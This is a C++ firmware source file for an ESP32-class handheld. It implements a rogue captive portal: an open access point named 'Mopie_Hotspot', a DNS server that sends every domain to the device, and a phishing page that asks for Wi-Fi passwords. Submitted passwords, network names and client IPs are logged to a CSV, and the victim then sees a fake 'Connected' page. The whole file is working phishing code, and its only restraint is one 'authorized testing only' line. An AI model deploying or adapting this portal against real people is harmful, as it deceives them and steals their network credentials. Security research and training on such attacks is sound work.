#include "mopie_portal.h"
#include "mopie_tx.h"
#include "core/mykeyboard.h"
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>
#include <WiFi.h>
#include <FS.h>
#include <SD.h>
#include <LittleFS.h>

// Mopie's own captive portal. From-scratch architecture (no EvilPortal internals):
//   * AP mode on a chosen SSID/channel (open network)
//   * a DNSServer that answers *any* query with our own IP -> forces captive UI
//   * one phishing login page served on every request
//   * POST handler that captures wifi/ssid + wifi/pass + mac into a CSV
//   * live counter on screen
//
// Small-footprint on purpose for the 520KB board.

namespace {
// ---- prerequisite from mopie_tx ----
// We reuse mopie_build_beacon to help advertise the AP if we choose; not needed,
// the AP itself advertises. Keep this module self-contained otherwise.

AsyncWebServer *g_server = nullptr;
DNSServer *g_dns = nullptr;
const byte DNS_PORT = 53;
int g_captured = 0;
IPAddress g_apIP(192, 168, 4, 1);

// The captive login page — minimal, Mopie-branded, asks for network password.
const char PORTAL_HTML[] =
    "<!DOCTYPE html><html><head><meta name=viewport content='width=device-width,initial-scale=1'>"
    "<title>Mopie Hotspot</title><style>"
    "body{background:#0d0d12;color:#e8e8f0;font-family:monospace;margin:0;padding:20px}"
    "h1{color:#00a0ff;font-size:20px}input{width:100%;padding:10px;margin:6px 0;background:#1a1a22;"
    "border:1px solid #333;color:#fff;font-size:16px}button{width:100%;padding:12px;background:#00a0ff;"
    "color:#000;border:0;font-size:16px;font-weight:bold}.t{font-size:12px;color:#888}"
    "</style></head><body>"
    "<h1>MOPIE HOTSPOT</h1><p class=t>network secured · sign in to continue</p>"
    "<form method=post action='/capture'>"
    "<input type=text name=wifi placeholder='WiFi network'>"
    "<input type=password name=pass placeholder='Network password'>"
    "<input type=hidden name=verify value='1'>"
    "<button>Connect</button></form>"
    "<p class=t>Mopie Agent · authorized testing only</p></body></html>";

String g_csvName = "/MopiePortal/creds.csv";
}  // namespace

// Serve the page on any GET.
static void servePortal(AsyncWebServerRequest *r) {
    r->send(200, "text/html", PORTAL_HTML);
}

// Capture submitted credentials.
static void captureCreds(AsyncWebServerRequest *r) {
    String ssid = r->arg("wifi");
    String pass = r->arg("pass");
    if (!pass.isEmpty()) {
        g_captured++;
        // append to LittleFS (always available, no SD churn on the small board)
        LittleFS.begin();
        if (!LittleFS.exists("/MopiePortal")) LittleFS.mkdir("/MopiePortal");
        File f = LittleFS.open(g_csvName, FILE_APPEND);
        if (f) {
            f.printf("%s,%s,%s\n", r->client()->remoteIP().toString().c_str(),
                     ssid.c_str(), pass.c_str());
            f.close();
        }
    }
    // Redirect to a fake "connected" page
    r->send(200, "text/html",
            "<html><body style='background:#0d0d12;color:#0f0;font-family:monospace;"
            "padding:30px'><h1>Connected.</h1><p>Welcome back.</p></body></html>");
}

int mopiePortal() {
    if (ESP.getFreeHeap() < 120000) { Serial.println("[portal] low heap"); return -1; }
    g_captured = 0;

    // --- bring up an open AP ---
    String ssid = "Mopie_Hotspot";
    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(g_apIP, g_apIP, IPAddress(255, 255, 255, 0));
    if (!WiFi.softAP(ssid.c_str(), nullptr, 6)) return -1;

    // --- DNS + web server ---
    g_server = new AsyncWebServer(80);
    g_dns = new DNSServer();
    g_dns->start(DNS_PORT, "*", g_apIP);          // answer any domain with our IP
    g_server->onNotFound(servePortal);
    g_server->on("/capture", HTTP_POST, captureCreds);
    g_server->begin();

    // --- screen ---
    tft.fillScreen(mopieConfig.bgColor);
    tft.setTextColor(mopieConfig.priColor, mopieConfig.bgColor);
    tft.drawCentreString("CAPTIVE PORTAL", tftWidth / 2, 12, 1);
    tft.setTextColor(mopieConfig.secColor, mopieConfig.bgColor);
    tft.drawCentreString("AP: " + ssid, tftWidth / 2, 30, 1);
    tft.drawCentreString("Gate: 192.168.4.1", tftWidth / 2, 44, 1);

    unsigned long t0 = millis();
    int lastCaptured = -1;
    while (!check(EscPress) && millis() - t0 < 300000) {   // 5 min cap
        g_dns->processNextRequest();
        if (g_captured != lastCaptured) {
            lastCaptured = g_captured;
            tft.setTextColor(TFT_GREEN, mopieConfig.bgColor);
            tft.drawCentreString(String(g_captured) + " creds", tftWidth / 2, 66, 1);
        }
        vTaskDelay(20);
    }

    // --- teardown ---
    g_dns->stop(); delete g_dns; g_dns = nullptr;
    delete g_server; g_server = nullptr;
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    return g_captured;
}